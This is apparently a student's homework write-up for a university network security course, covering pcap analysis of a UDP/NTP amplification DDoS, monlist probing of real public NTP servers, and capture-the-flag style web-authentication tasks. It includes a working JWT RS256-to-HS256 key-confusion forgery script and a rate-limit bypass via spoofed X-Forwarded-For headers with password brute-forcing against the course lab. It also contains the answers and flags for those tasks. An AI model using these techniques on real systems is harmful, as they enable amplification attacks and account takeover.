---
title: Cryptography and Network Security – Homework 3
tags: [NTUCNS, NTU]

category: "Security/Course/NTU CNS/Homework"
---

# Cryptography and Network Security – Homework 3

[![hackmd-github-sync-badge](https://hackmd.io/JO7xByQgQWK67eU0goHMeA/badge)](https://hackmd.io/JO7xByQgQWK67eU0goHMeA)

###### tags: `NTUCNS`
:::spoiler TOC
[TOC]
:::

## 1. DDoS

### 1)
* Hint: You can use I/O Graphs to find the time that the flow starts to burst. Then you can find the first packet near there.

* Ans: Using I/O graph in `Statistic/I/O Graphs` in wireshark, then you can figure out the whole trend of this network flow.
    :::spoiler Result Screenshot
    ![](https://hackmd.io/_uploads/rJk-LueL3.jpg)
    :::
    Also, you can set the different scale of the graph and figure out the attack time precisely. I set the `Interval=100ms` and find the increasing time at `24.8s` which is `No.55862` packet shown as below.
    :::spoiler Result Screenshot
    ![](https://hackmd.io/_uploads/ryG7POxL2.png)
    :::
    Thus, the attack time should be at <font color="FF0000">`24.945277`</font> and the victim is <font color="FF0000">`192.168.232.95`</font>
    :::spoiler Result Screenshot
    ![](https://hackmd.io/_uploads/Syurtue8h.png)
    :::
    
    :::info
    Note: You can observe that how many packets of each address received or transmitted in `Statistic/Endpoints`. You can note that the address `192.168.232.95` has received tons of packets.
    :::spoiler Result Screenshot
    ![](https://hackmd.io/_uploads/BJ6r9dgI3.png)
    :::

### 2)
* Hint: How to find attack packets if you know the victim?
* Ans: The protocol that the attack exploit is <font color="FF0000">`UDP`</font>. Maybe this is a `UDP` flood attack. And the size of an attack packet should be <font color="FF0000">$482$</font> bytes.
* Note: You can set the filter `ip.dst==192.168.232.95 && udp` and observe the flow and packets.
    :::spoiler Result Screenshot
    ![](https://hackmd.io/_uploads/HJ4hkte8n.png)
    :::

### 3)
* Ans: 

### 4)
* Background: this DDoS attack using NTP protocol to amplify the packets to achieve the attack.
    > NTP 放大 DoS 攻擊利用響應遠程 monlist 請求的網絡時間協議（NTP）服務器。 monlist 函數返回與服務器交互的所有設備的列表，在某些情況下最多達 600 個列表。 攻擊者可以偽造來自目標 IP 地址的請求，並且漏洞服務器將為每個發送的請求返回非常大的響應 - by [Kali Linux網絡掃描秘籍第六章拒絕服務(二)](https://cloud.tencent.com/developer/article/2182801)
    :::spoiler Background
    ![](https://hackmd.io/_uploads/BkX8K9eL2.png)
    :::
* Hint: You can find some useful statistics in `IPv4 Statistics`.
* Ans: In `IPv4 Statistics`, we can note the several victims receive most of the packets. $\to$ <font color="FF0000">`192.168.232.80`, `192.168.232.10`, `192.168.232.95`</font>
    :::spoiler Result Screenshot
    ![](https://hackmd.io/_uploads/B1W9QcgIn.png)
    
    ![](https://hackmd.io/_uploads/SyBgw5xLh.png)
    :::
    * `192.168.232.80`: 28320 packets received
    * `192.168.232.10`: 26870 packets received
    * `192.168.232.95`: 23327 packets received
    * 3 major amplifiers: <font color="FF0000">`34.93.220.190`, `128.111.19.188`, `129.236.255.8`</font>

### 5)
* Background:
    > NTP 放大 DoS 攻擊利用響應遠程 monlist 請求的網絡時間協議（NTP）服務器。 monlist 函數返回與服務器交互的所有設備的列表，在某些情況下最多達 600 個列表。 攻擊者可以偽造來自目標 IP 地址的請求，並且漏洞服務器將為每個發送的請求返回非常大的響應 - by [Kali Linux網絡掃描秘籍第六章拒絕服務(二)](https://cloud.tencent.com/developer/article/2182801)
    > 
    > NTP放大攻擊：網路時間協定(Network Time Protocol, NTP)是一種允許主機之間透過封包交換進行系統時間同步之網路協定。但在NTP協定中，有一個monlist指令，當NTP伺服器收到monlist請求後，會回傳多筆近期與之通訊的列表，該列表最高限制為600筆。而攻擊者便可利用此機制，以偽裝之IP位址寄送monlist請求給NTP伺服器，則NTP伺服器便會將至多600筆之數據傳送給遭攻擊者偽冒的IP位址，導致遭偽冒之受害主機因一次大量的數據傳輸，造成其網路頻寬無法負荷，致使受害伺服器無法正常提供服務。此種攻擊之放大係數為556.9，為所有DDoS放大攻擊中放大倍率次高者。 - by [分散式阻斷服務攻擊(DDoS)趨勢與防護](https://www.twcert.org.tw/tw/cp-157-6408-e0c62-1.html)
* Hint: You can use `nmap` or `ntpdc` to send a monlist query.
* Ans:
    1. Determine if the remote server is running NTP service
        I tried 9 IP(3 IP from previous question + 6 IPs provided from TAs)
        Note: `-sU` option can be used to specify <font color="FF0000">UDP</font>, then the `-p` option can be used to specify the port
        :::spoiler Command Result
        ```bash!
        $ sudo nmap -sU 128.111.19.188 -p 123
        Starting Nmap 7.80 ( https://nmap.org ) at 2023-05-28 22:01 CST
        Nmap scan report for cms28.physics.ucsb.edu (128.111.19.188)
        Host is up (0.15s latency).
        
        PORT    STATE  SERVICE
        123/udp closed ntp
        
        Nmap done: 1 IP address (1 host up) scanned in 0.92 seconds
        $ sudo nmap -sU 34.93.220.190 -p 123
        Starting Nmap 7.80 ( https://nmap.org ) at 2023-05-28 23:32 CST
        Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
        Nmap done: 1 IP address (0 hosts up) scanned in 3.21 seconds
        $ sudo nmap -sU 129.236.255.89 -p 123
        Starting Nmap 7.80 ( https://nmap.org ) at 2023-05-28 23:32 CST
        Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
        Nmap done: 1 IP address (0 hosts up) scanned in 3.16 seconds
        $ sudo nmap -sU 142.44.162.188 -p 123
        Starting Nmap 7.80 ( https://nmap.org ) at 2023-05-28 23:34 CST
        Nmap scan report for 188.ip-142-44-162.net (142.44.162.188)
        Host is up (0.19s latency).
        
        PORT    STATE SERVICE
        123/udp open  ntp
        
        Nmap done: 1 IP address (1 host up) scanned in 1.06 seconds
        sudo nmap -sU 91.121.132.146 -p 123
        Starting Nmap 7.80 ( https://nmap.org ) at 2023-05-28 23:35 CST
        Nmap scan report for ns3002114.ip-91-121-132.eu (91.121.132.146)
        Host is up (0.28s latency).
        
        PORT    STATE SERVICE
        123/udp open  ntp
        
        Nmap done: 1 IP address (1 host up) scanned in 1.59 seconds
        $ sudo nmap -sU 82.65.72.200 -p 123
        Starting Nmap 7.80 ( https://nmap.org ) at 2023-05-28 23:35 CST
        Nmap scan report for 82-65-72-200.subs.proxad.net (82.65.72.200)
        Host is up (0.26s latency).
        
        PORT    STATE SERVICE
        123/udp open  ntp
        
        Nmap done: 1 IP address (1 host up) scanned in 1.40 seconds
        $ sudo nmap -sU 81.23.0.110 -p 123
        Starting Nmap 7.80 ( https://nmap.org ) at 2023-05-28 23:35 CST
        Nmap scan report for clients-0.23.81.110.misp.ru (81.23.0.110)
        Host is up (0.29s latency).
        
        PORT    STATE         SERVICE
        123/udp open|filtered ntp
        
        Nmap done: 1 IP address (1 host up) scanned in 5.57 seconds
        $ sudo nmap -sU 72.76.155.29 -p 123
        Starting Nmap 7.80 ( https://nmap.org ) at 2023-05-28 23:36 CST
        Nmap scan report for static-72-76-155-29.nwrknj.fios.verizon.net (72.76.155.29)
        Host is up (0.21s latency).
        
        PORT    STATE SERVICE
        123/udp open  ntp
        
        Nmap done: 1 IP address (1 host up) scanned in 1.17 seconds
        $ sudo nmap -sU 61.216.81.26 -p 123
        Starting Nmap 7.80 ( https://nmap.org ) at 2023-05-28 23:37 CST
        Nmap scan report for 61-216-81-26.hinet-ip.hinet.net (61.216.81.26)
        Host is up (0.017s latency).
        
        PORT    STATE         SERVICE
        123/udp open|filtered ntp
        
        Nmap done: 1 IP address (1 host up) scanned in 0.55 seconds
        ```
        :::
        Final Result:
        34.93.220.190 $\to$ down
        128.111.19.188 $\to$ closed
        129.236.255.89 $\to$ down
        142.44.162.188 $\to$ open
        91.121.132.146 $\to$ open
        82.65.72.200 $\to$ open
        81.23.0.110 $\to$ open|filtered
        72.76.155.29 $\to$ open
        61.216.81.26 $\to$ open|filtered

    2. Determine if NTP service can be used for amplification attacks
        :::spoiler Command Result
        ```bash!
        $ ntpdc -n -c monlist 34.93.220.190
        34.93.220.190: timed out, nothing received
        ***Request timed out
        $ ntpdc -n -c monlist 128.111.19.188
        ntpdc: read: Connection refused
        $ ntpdc -n -c monlist 129.236.255.89
        129.236.255.89: timed out, nothing received
        ***Request timed out
        $ ntpdc -n -c monlist 142.44.162.188
        remote address          port local address      count m ver rstr avgint  lstint
        ===============================================================================
        213.251.128.249          123 142.44.162.188         1 4 4      0    373     373
        54.39.23.64              123 142.44.162.188         1 4 4      0    429     429
        105.187.151.14         59585 142.44.162.188         1 3 2      0    784     784
        ...
        $ ntpdc -n -c monlist 91.121.132.146
        91.121.132.146: timed out with incomplete data
        ***Response from server was incomplete
        $ ntpdc -n -c monlist 82.65.72.200
        82.65.72.200: timed out with incomplete data
        ***Response from server was incomplete
        $ ntpdc -n -c monlist 81.23.0.110
        81.23.0.110: timed out with incomplete data
        ***Response from server was incomplete
        $ ntpdc -n -c monlist 72.76.155.29
        72.76.155.29: timed out with incomplete data
        ***Response from server was incomplete
        $ ntpdc -n -c monlist 61.216.81.26
        61.216.81.26: timed out, nothing received
        ***Request timed out
        ```
        :::
        In this moment the final result:
        34.93.220.190 $\to$ timed out
        128.111.19.188 $\to$ Connection refused
        129.236.255.89 $\to$ timed out
        142.44.162.188 $\to$ <font color="FF0000">Success</font>
        91.121.132.146 $\to$ incomplete
        82.65.72.200 $\to$ incomplete
        81.23.0.110 $\to$ incomplete
        72.76.155.29 $\to$ incomplete
        61.216.81.26 $\to$ timed out
    3. Record the network flow and compute the amplification factor
       In my network situation and remote server circumstances, I received 100 packets with $482\ bytes*100\ packets=48200\ bytes$ from NTP server so the amplification factor is just <font color="FF0000">$48200/234 \cong 206$</font> directly (234 is transmit packet size).
        :::spoiler Result Screenshot
        ![](https://hackmd.io/_uploads/SyUpW5-8h.png)
        :::

### 6)
* Ans 1: 
    * Implement rate limiting to restrict the number of UDP packets from a single source IP.
    * Use traffic filtering mechanisms like ACLs or firewalls to block malicious UDP traffic.
    * Deploy IPS/IDS systems to automatically block or mitigate the attack.
    * Enable flow monitoring to detect abnormal traffic patterns.
* Ans 2:
    * Deploy firewalls and routers with robust security features.
    * Use IDS/IPS systems to detect and block malicious UDP traffic.
    * Implement traffic shaping and QoS to prioritize legitimate traffic.
    * Consider using specialized DDoS mitigation services.
    * Monitor network traffic for signs of UDP flood attacks.
    * Keep network infrastructure and security measures up to date.

## 2. Smart Contract
(SKIP...)

## 3. Web Authentication

### a)
Username: `CNS-user`
Password: `CNS-password`
1. Basic Authentication
How to deploy your service? You can refer to [this video](https://www.youtube.com/watch?v=G1EVWLjwvrE&ab_channel=TechieBlogging) and remember to set the extra command `pip install flask-httpauth` to install other library.
    :::spoiler Example Screenshot
    ![](https://hackmd.io/_uploads/Sko6ZheD2.png)
    :::
    :::spoiler Whole Script
    ```python=
    from flask import Flask
    from flask_httpauth import HTTPBasicAuth

    app = Flask(__name__)
    auth = HTTPBasicAuth()

    users = {
        "CNS-user": "CNS-password",
    }

    @auth.verify_password
    def verify_password(username, password):
        if username in users and password == users[username]:
            return username

    @app.route('/')
    @auth.login_required
    def index():
        return "Hello, {}!".format(auth.current_user())

    if __name__ == '__main__':
        app.run(port=8880)
    ```
    :::
    Flag: `CNS{H77P_4U7h_r0CK2}`

2. Cookie-Based Authentication
    :::spoiler Description
    > In this subtask, you will implement cookie-based authentication.
    First, I will perform 'POST /', which contains two fields: 'username' and 'password', in application/x-www-form-urlencoded format.
    Then I will execute 'GET /', which will contain the cookies returned in the previous POST request.
    :::
    :::spoiler Whole Script
    ```python=
    from flask import Flask, request, redirect, render_template, make_response
    import hashlib
    
    app = Flask(__name__)
    app.secret_key = 'your_secret_key'
    
    users = {
        'CNS-user': {
            'password': 'CNS-password'
        },
    }
    
    @app.route('/', methods=["GET", 'POST'])
    def login():
        if request.method == 'POST':
            username = request.form["username"]
            password = request.form['password']
            print(username, password)
    
            if username in users and users[username]['password'] == password:
                response = make_response(redirect('/'))
                response.set_cookie('username', hashlib.sha256(password.encode()).hexdigest())
                return response, 200
            return 'Invalid username or password!', 401
    
        elif request.method == "GET" and request.cookies.get("username") == hashlib.sha256(b'CNS-password').hexdigest():
            return "Success", 200
    
        elif request.method == "GET" and request.cookies.get("username") != hashlib.sha256(b'CNS-password').hexdigest():
            if request.cookies.get("username") != None:
                return "Unsuccess", 401
            else:
                return "Hello", 401


    if __name__ == '__main__':
        app.run(host="127.0.0.1", port=7777, debug=True)
    ```
    :::
    Flag: `CNS{CooK135_4R3_d3L1c1ou2}`
3. JWT-Based
    :::spoiler Description
    > In this subtask, you will implement JWT-based authentication.
    First, I will execute 'POST /', which contains two fields: 'username' and 'password', in application/x-www-form-urlencoded format.
    Your service should output the token directly in the HTTP response body.
    Then I will execute 'GET /' with the token.
    :::

### b)
* Basic HTTP Authentication:
    * Pros:
        Simple to implement and widely supported by browsers and servers.
        No additional server-side storage required, as the credentials are sent with each request.
    * Cons:
        The credentials are sent with every request, which can increase the risk if the connection is not secured with HTTPS.
        The password is base64-encoded, which is not a secure encryption method. It can be easily decoded if intercepted.
    * Basic HTTP Authentication is a simple and widely supported method, but it has security limitations. Sending credentials with each request can be risky, especially if the connection is not secured. Additionally, base64 encoding doesn't provide encryption, making it vulnerable to interception.
* Cookie-based Authentication:
    * Pros:
        Stateless on the server side. The server doesn't need to store user sessions as the session ID is included with each request.
        Session ID is stored on the client-side, making it less vulnerable to interception.
    * Cons:
        Requires server-side storage or a session management system to handle session IDs securely.
        Vulnerable to session hijacking if proper security measures like session expiration and secure cookie flags are not implemented.
    * Cookie-based Authentication is more secure than Basic Authentication as the session ID is stored on the client-side. However, it requires server-side storage or session management systems. If proper security measures are not implemented, session hijacking attacks can occur.
* JWT-based Authentication:
    * Pros:
        Stateless on the server side. The server doesn't need to store session data as all required information is encoded in the JWT.
        Enables easy scalability and interoperability, as JWTs can be used across multiple services or distributed systems.
        Allows for fine-grained control by including user-related data (claims) within the token.
    * Cons:
        The server needs to maintain the secret key securely to prevent unauthorized JWT issuance or tampering.
        If a JWT is compromised, it remains valid until its expiration time, as tokens are self-contained and don't require round-trips to the server for validation.
    * JWT-based Authentication is a stateless and scalable method, making it suitable for distributed systems. It allows for fine-grained control and doesn't require server-side storage. However, the server needs to securely manage the secret key. If a JWT is compromised, it remains valid until expiration.

### c)

#### Recon
Alice implemented a great web service that uses the `JWT` stored in the cookie to authenticate users. So, we can access the token as below:
* Header: `{"alg":"RS256","typ":"JWT"}`
* Payload: `{"username":"guest","flag1":"CNS{JW7_15_N07_a_900d_PLACE_70_H1DE_5ecrE75}","exp":1686041128}`
* :::spoiler Signature with base64 encode:
    `Wz1mXQiYh3OvEdrQ2y1nWTwAbNs7HE1rjBQ8HBv9DhFLax9im4J4CQqS-vXymyuLJGXnrq18b4HlurRwjoIo1036ecsHM_dQfkkUZm9NqhYMmRwl1DRjQx7RvH4FccBIXhhOBu2Jzw3pSHfILFmMUqg26weWiu4f-gE3u5by0ylMqfIwZtG-J-VLA9QFSth9vobjM610MNIuTPQODH9r8Cy1cpttZ2QPuHfPMPARF11kIIJ-ebDXnV6t1I7FB6Nv4-Mk3JUsBOKBRMVh1eiZ2_3Xx4YzNUfZb5LQzCMcjsMpHWoV1WvIEEMW5SXAVOCbCyRUhcVtqXVI_VodM_hnKA`
    :::
* Flag 1: Just hide in cookie and use `base64` online decoder, you'll obtain `CNS{JW7_15_N07_a_900d_PLACE_70_H1DE_5ecrE75}`

#### Exp for another flag
The description said another flag is hidden in the account with the username `admin`. Thus, we can tamper the token that used different algorithm to sign the payload.

* Problem 1:
If we have to used another algorithm like `HS256`, we need RSA public key to sing the payload. What is public key(n, e) in this token?
* Problem 2:
How to generate `.pem` file?
* Problem 3:
How to implement `JWT` signature to sign the payload?

---
1. Find the `N` and `e` of RSA public key
We note that every time your refresh the web page, the tokens are quite different because of different expired time.
So, how can we used these plaintext and signature pair to construct original `N`
$$
\downarrow\\
m_1^e \equiv c_1\ (mod\ N)\\
m_2^e \equiv c_2\ (mod\ N)\\
m_3^e \equiv c_3\ (mod\ N)\\
\downarrow\\
m_1^e - c_1\ = \alpha N\\
m_2^e - c_2\ = \beta N\\
m_3^e - c_3\ = \gamma N
$$
Thus, we can find $N$ using $gcd(αN, βN, γN)=N$. Note that the large number calculation can use <font color="FF0000">`gmpy2`</font> library.

    :::danger
    Remember the work flow of signature in RSA: You can refer [this page](https://pycryptodome.readthedocs.io/en/latest/src/signature/pkcs1_v1_5.html)
    The work flow is `b'hello'`$\to$do hash by `sha256`$\to$do padding by`pkcs#1v1.5`$\to$ then sign$\to$ciphertext
    
    Note 2 From TA: PKCS v1.5 padding 在encryption與signature的操作不太一樣喔，有 random bytes的是encryption，詳細可以參考[spec](https://www.rfc-editor.org/rfc/rfc3447#section-9.2)
    :::
    :::spoiler Exp Script
    ```python=
    import base64
    import gmpy2
    from Crypto.Signature import pkcs1_15
    from Crypto.Hash import SHA256
    from base64 import urlsafe_b64encode, urlsafe_b64decode
    import jwt
    from Crypto.PublicKey import RSA
    
    '''
    Compute RSA Public Key - (N, e)
    '''
    def initialize(message, c_or_m):
        if c_or_m == 'c':
            return gmpy2.mpz(int(base64.urlsafe_b64decode(message).hex(), 16))
        elif c_or_m == 'm':
            return gmpy2.mpz(int(pkcs1_15._EMSA_PKCS1_V1_5_ENCODE(SHA256.new(message.encode()), 256).hex(), 16))
    
    ciphertext = {
        0 : "AMpJDyvv2burdO35LvbtykwdhCOItlRv0pyvE3WB7ysDqrpmy0ZbIJfkvddHLBMTLad9jgz9DV9B_Y4aPNIAs6_QibK22BoPMwmbhE_qw88rMjpf5Ph-SmmuTb51VLz4gO9QEX03AekBD5VHYHttuyln4AJdZ8y0-VUCvlyi_lEDqmRPpCnCUN1tuK6KcnKVa0IfaB1kTKzBFEFtL3oPrC9Qtp5bkYxrPXslhYhlCHRDjL_TrGn_A5g5CwONHFNczVNRig5oSyY6XV49vAJrxWMUeNKXkU49JLgGYF01tQvRDPi7m7gtTVjhQLVTV_-qkYuVbGr2bgx2PhSheA2Xcg==",
        1 : "R8QnOGx9aBt7Hjh6wXG3JmqhutNB7a7oCNWZvVUg4bhtdVWpG1WyehCczOnBs-uLcZnXg4AO6ppf4Qt2p70s7dCKsSv3YJ2L_BBXFWjlgSmNlfxTznGgMY49_0l8hmSB4A1TRbIrxLmncZmmHiTt7Fm-sUNqCl097myfu-54sMNunZktpNrQfj9PYrQuDf2HmEfw-7uDGQPThSl0vjTBQDW3adnRZOKtQ1n-xDucEVy5twxS6Tn8LNs25xn7u2ts8qFrVHFe_WlihBmZgGjmgjvkbhcKinQ3uLFx5XRw_kpQ1yjN9NMZcELV_XeGLExuRIS4TundCGYLuDIp8NKLhQ==",
        2 : "BfwxVR2DBeti1TdWm37Mj9V6hYOz-tdTisf7Lu98tz-jQgHWDUkM0RDzjUYha6wH7ZCqXGn8Les4Lk-k5zbpT_flEtu6e_w5wEKJbm2-i6OeZxZLiXLP0aOs-sSVmkdcRR-3tGWSuA6SL4VQokZUTv-4Td5FrurU6NKi6ZuwSWk8F5O6MIBi7Boncv6SnWtH93GsHCeXlVmQKvSWH0dPJDS00UwvtNSQ9moF0zhuBWIZqhjS89VWwWt5LJnbtzkEGSM5MxYsk-F8xKntwO9oiPYWeK-mo9JvGg6RnM5Poanzzbmcdw055X1wseBS2Pbv1pPEN0g6mHKuRQoc7slWEA==",
        3 : "M74GetHK2cRPuaB9HFrXYhMX8iAaQmyEOCC2xIGaYDTgZ0EfbcyST5acMfHmlLZ4ylsCVzIc3uoRWHnKo-KTTn4ECCWpdAzbzKvlpxurm4zF1b1oAfsnw7Mdv68XR1X7FEpnGT2FnXJNTbhEOwc2Bb8qgy8lYVXhIKuL-0734JWjs9V4V3UnC2TBcXfwRR1xddeXzEYoyGAm_vIY9T051jTT0OljDruQhIDH1kPTuBrJNXuedDlIc9BXZzPcBsKPdRhFb7EET8C-UheTwDM8tLAykWNcegf0-VVqP92bC80scJEgKV7HHtPU6nh7FA0_i49QSMndRsFB_96RjdTSQA=="
    }
    
    plaintext = {
        0 : "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZmxhZzEiOiJDTlN7Slc3XzE1X04wN19hXzkwMGRfUExBQ0VfNzBfSDFERV81ZWNyRTc1fSIsImV4cCI6MTY4NjU4Mzc1OX0",
        1 : "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZmxhZzEiOiJDTlN7Slc3XzE1X04wN19hXzkwMGRfUExBQ0VfNzBfSDFERV81ZWNyRTc1fSIsImV4cCI6MTY4NjU4MzgwNX0",
        2 : "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZmxhZzEiOiJDTlN7Slc3XzE1X04wN19hXzkwMGRfUExBQ0VfNzBfSDFERV81ZWNyRTc1fSIsImV4cCI6MTY4NjU4Mzg1MH0",
        3 : "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZmxhZzEiOiJDTlN7Slc3XzE1X04wN19hXzkwMGRfUExBQ0VfNzBfSDFERV81ZWNyRTc1fSIsImV4cCI6MTY4NjU4Mzg4Mn0"
    }
    
    c = {}
    m = {}
    for i in range(4):
        c[i] = initialize(ciphertext[i], 'c')
        m[i] = initialize(plaintext[i], 'm')


    e = gmpy2.mpz(65537) # The default parameter in openssl
    a_N = c[0]**e - m[0]
    b_N = c[1]**e - m[1]
    c_N = c[2]**e - m[2]
    
    n = gmpy2.gcd(a_N, b_N, c_N)
    ```
    :::
2. Generate `public-key.pem` file
Now, we know what `N` is, so we can generate a `.pem` file with properly format. According to [this page](https://stackoverflow.com/questions/76458680/how-can-i-generate-rsa-public-key-with-specified-n-and-e-parameter-by-using-open), the script is show as below:
    :::spoiler Whole script
    ```python
    from Crypto.PublicKey import RSA
    n = 0x8ffcd5ae700b26f96316817101f254071b082b209196371eabf52d9a5e80eb64d5f4c4a1533e147f3c27b7e941622c25db41f21f502f6fd94d4b994b9448d824f24d27845da8cf5f8e10ddd1ac05ef54c490aaa7ac028efafe205d0633c62cd72ff3f874497a67c5458adaec91be0859e82a300f345ecd007115b9cb653e6b9ba670ea61e31b4b4b13bcba8cb324777e751c6b9fe531f5c6d61dd459674e57d08c03e1202f66b835220d097a9429fa5dcc22f8fbf80ddb1bb0b59ad98d4b462619ec3642ea1f6fdb7420b9602b4a8c4f66aaa0932b36d7ab4102392cd71803076acf2947cd253ea5580a0c1228ddd7647ef3d6e7c43f3d5d9654cf0d47d390d1
    e = 0x10001
    key_params = (n, e)
    key = RSA.construct(key_params)
    f = open('./rsa-public-key.pem', 'w')
    f.write(key.exportKey().decode())
    f.close()
    ```
    :::

3. Implement `JWT` to sign the payload by using public key
   <font color="FF0000">Note that you must make sure that the public key has a new line symbol at the end of the file</font>
    :::spoiler Whole Script
    ```python
    import jwt
    import hashlib
    import hmac
    key = b"-----BEGIN PUBLIC KEY-----\n\
    MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAj/zVrnALJvljFoFxAfJU\n\
    BxsIKyCRljceq/Utml6A62TV9MShUz4Ufzwnt+lBYiwl20HyH1Avb9lNS5lLlEjY\n\
    JPJNJ4RdqM9fjhDd0awF71TEkKqnrAKO+v4gXQYzxizXL/P4dEl6Z8VFitrskb4I\n\
    WegqMA80Xs0AcRW5y2U+a5umcOph4xtLSxO8uoyzJHd+dRxrn+Ux9cbWHdRZZ05X\n\
    0IwD4SAvZrg1Ig0JepQp+l3MIvj7+A3bG7C1mtmNS0YmGew2Quofb9t0ILlgK0qM\n\
    T2aqoJMrNterQQI5LNcYAwdqzylHzSU+pVgKDBIo3ddkfvPW58Q/PV2WVM8NR9OQ\n\
    0QIDAQAB\n\
    -----END PUBLIC KEY-----\n"
    header = '{"alg": "HS256", "typ": "JWT"}'
    payload = '{"username":"admin","flag1":"CNS{JW7_15_N07_a_900d_PLACE_70_H1DE_5ecrE75}","exp":1786583759}'
    header = base64.urlsafe_b64encode(bytes(header, "utf-8")).decode().replace("=", "").encode()
    payload = base64.urlsafe_b64encode(bytes(payload, "utf-8")).decode().replace("=", "").encode()
    sig = hmac.new(key, header + b'.' + payload, hashlib.sha256).digest().strip()
    sig = base64.urlsafe_b64encode(sig).decode().replace("=", "")
    jwt = '{}.{}.{}'.format(header.decode(), payload.decode(), sig)
    print(jwt)
    ```
    :::
4. Then replace the web page original token and you'll get the flag
Note that the expire time in payload should be careful.

* Flag 2: `CNS{4L9_15_un7Ru573d_u53r_1nPU7}`

### d)
* Just follow the [library code](https://github.com/pyauth/pyotp/tree/develop)
    :::spoiler Script Code
    ```python!
    '''
    Implement TOTP
    '''
    import calendar
    import datetime
    import hashlib
    import time
    from typing import Any, Optional, Union
    import unicodedata
    from hmac import compare_digest
    from typing import Dict, Optional, Union
    from urllib.parse import quote, urlencode, urlparse
    import base64
    import hmac


    class OTP(object):
        def __init__(
            self,
            s: str,
            digits: int = 6,
            digest: Any = hashlib.sha1,
            name: Optional[str] = None,
            issuer: Optional[str] = None,
        ) -> None:
            self.digits = digits
            if digits > 10:
                raise ValueError("digits must be no greater than 10")
            self.digest = digest
            self.secret = s
            self.name = name or "Secret"
            self.issuer = issuer
    
        def generate_otp(self, input: int) -> str:
            if input < 0:
                raise ValueError("input must be positive integer")
            hasher = hmac.new(self.byte_secret(), self.int_to_bytestring(input), self.digest)
            hmac_hash = bytearray(hasher.digest())
            offset = hmac_hash[-1] & 0xF
            code = (
                (hmac_hash[offset] & 0x7F) << 24
                | (hmac_hash[offset + 1] & 0xFF) << 16
                | (hmac_hash[offset + 2] & 0xFF) << 8
                | (hmac_hash[offset + 3] & 0xFF)
            )
            str_code = str(10_000_000_000 + (code % 10**self.digits))
            return str_code[-self.digits :]
    
        def byte_secret(self) -> bytes:
            secret = self.secret
            missing_padding = len(secret) % 8
            if missing_padding != 0:
                secret += "=" * (8 - missing_padding)
            return base64.b32decode(secret, casefold=True)
    
        @staticmethod
        def int_to_bytestring(i: int, padding: int = 8) -> bytes:
            result = bytearray()
            while i != 0:
                result.append(i & 0xFF)
                i >>= 8
            return bytes(bytearray(reversed(result)).rjust(padding, b"\0"))


    class TOTP(OTP):
        def __init__( self, s: str, digits: int = 6, digest: Any = None, name: Optional[str] = None, issuer: Optional[str] = None, interval: int = 30 ) -> None:
            if digest is None:
                digest = hashlib.sha1
    
            self.interval = interval
            super().__init__(s=s, digits=digits, digest=digest, name=name, issuer=issuer)
    
        def now(self) -> str:
            return self.generate_otp(self.timecode(datetime.datetime.now()))
    
        def timecode(self, for_time: datetime.datetime) -> int:
            if for_time.tzinfo:
                return int(calendar.timegm(for_time.utctimetuple()) / self.interval)
            else:
                return int(time.mktime(for_time.timetuple()) / self.interval)


    '''
    Using TOTP solve problem
    '''
    import pyotp
    import time
    from pwn import *


    def TOTP_new(shared_secret):
        totp = TOTP(shared_secret)
        return totp.now()
    
    def TOTP_old(shared_secret):
        totp = pyotp.TOTP(shared_secret)
        return totp.now()
    
    test = "5VZG4WBEPL3NLPG7QTLDLD3EWOM37IDE"
    print(TOTP_new(test))
    print(TOTP_old(test))
    
    # r = remote("cns.csie.org", 17504)
    # context.arch = 'amd64'
    # r.recvline()
    
    # for i in range(128):
    #     key = r.recvline().strip().split()[-1].decode()
    #     r.sendline(TOTP_new(key).encode())


    # r.interactive()
    ```
    :::
    Flag: `CNS{2FA_15_9R347_y0U_5H0Uld_h4v3_0N3}`

### e)
* Hint 1: There are strings in the cookie that look like hashes, what could they be? 
* Hint 2: If you failed to figure out what hint 1 means, here’s another method. It’s the era of Machine Learning. Even babies know what Convolutional Neural Network is. 
* Hint 3: What are some common ways to get the user’s IP when the web service is behind a reverse proxy? Are these common practices secure?

#### Recon and Hint
* From the hint and description, we know that our goal is to brute force this login authentication with <font color="FF0000">captcha challenge</font> and <font color="FF0000">rate limitations(3 attempts)</font>.
* As the [reference here](https://xxgblog.com/2018/10/12/x-forwarded-for-header-trick/), we can bypass the rate limitation.
* As the hint above, we have 2 types attack, `CNN recognition`, `replay attack`, and I choose `replay attack`, btw.
The replay attack is just fit the same cookie and captcha parameter at each attack, then we can bypass this captcha.

#### How to exploit?
1. Access `http://cns.csie.org:17505` in Burp Suite
Intercept the packet and send to <font color="FF0000">Intruder</font>
2. Generate variety IP
    ```python!
    f = open("./Gen_IP.txt", "w")
    
    for i in range(256):
        for j in range(256):
            f.write("140.112."+str(i)+"."+str(j)+"\n")
    
    f.close()
    ```
3. wget password payload
    ```bash!
    $ wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/xato-net-10-million-passwords-10000.txt
    ```
4. Set Payload & Start Attack
    * Use <font color="FF0000">`Pitchfork`</font> as your attack type
        :::spoiler Screenshot
        ![](https://hackmd.io/_uploads/rkQvwz1v2.png)
        ![](https://hackmd.io/_uploads/BknuPG1wh.png)
        ![](https://hackmd.io/_uploads/SkKtPG1P2.png)
        :::
        Password: `everett`
        Flag: `CNS{8Ru73_f0Rc3_Pr3v3n710N_C4n_83_C0mPl1c473d}`

### f)
One modern authentication method is the FIDO2 security key. This is a physical device that can be used to sign in to web-based applications and Windows 10 devices with your Azure AD account without entering a username or password. It is based on the open standards of FIDO2, which include the WebAuthn protocol and the Client to Authentication Protocol (CTAP).

The FIDO2 security key works by generating a public-private key pair for each account that you register with it. The private key is stored securely on the device, and the public key is sent to the service provider (such as Azure AD) along with a randomly generated attestation certificate that proves the authenticity of the device. When you sign in with the FIDO2 security key, the service provider sends a nonce (a random number) to the device, which signs it with the private key and sends it back. The service provider then verifies the signature using the public key and grants access.

The FIDO2 security key method is better than traditional methods such as passwords or tokens for several reasons:

